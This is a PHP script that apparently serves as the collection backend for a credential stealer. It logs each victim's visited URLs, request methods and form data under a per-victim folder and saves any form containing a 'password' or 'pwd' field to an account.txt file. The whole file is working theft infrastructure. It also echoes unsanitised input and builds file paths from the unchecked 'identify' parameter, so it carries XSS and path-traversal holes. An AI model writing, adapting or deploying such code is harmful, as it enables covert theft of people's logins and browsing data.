<?php
$time = date('d/m/y - G:i:s');

if (isset($_REQUEST['type']) && isset($_REQUEST['identify'])) {

    checkUserExist($_REQUEST['identify']);
    switch ($_REQUEST['type']) {
        case 'HTTP_REQUEST':
            
            (isset($_REQUEST['url'])) ? $url = base64_decode($_REQUEST['url']) : $url = '';
            (isset($_REQUEST['method'])) ? $method = $_REQUEST['method'] : $method = '';
            (isset($_REQUEST['formData'])) ? $formData = $_REQUEST['formData'] : $formData = '';
            //get data 
            $data_import = "----------$time----------<br>
- $url <br>
- $method <br>
- $formData <br>
-----------------------------<hr>
";
            echo $data_import;
            importData($data_import, $_REQUEST['identify'].'/http_request.txt');
            $form = json_decode($formData, true);
           
                if (isset($form['password']) || isset($form['pwd'])) {
                    $data_import = "<br>-----------------$time------------
$url
$formData
<hr>";
                    importData($data_import, $_REQUEST['identify'].'/account.txt');
                }
               
           

            break;
        
        default:
            # code...
            break;
    }
}

function checkUserExist($identify = '') {
    if (!is_dir('data/'.$identify)) {
        mkdir('data/'.$identify);
    }
    return true;
}

function importData($content = '', $dir) {
    $fp = fopen('data/'.$dir, 'a');//opens file in append mode  
    fwrite($fp, $content);   
    fclose($fp);  
}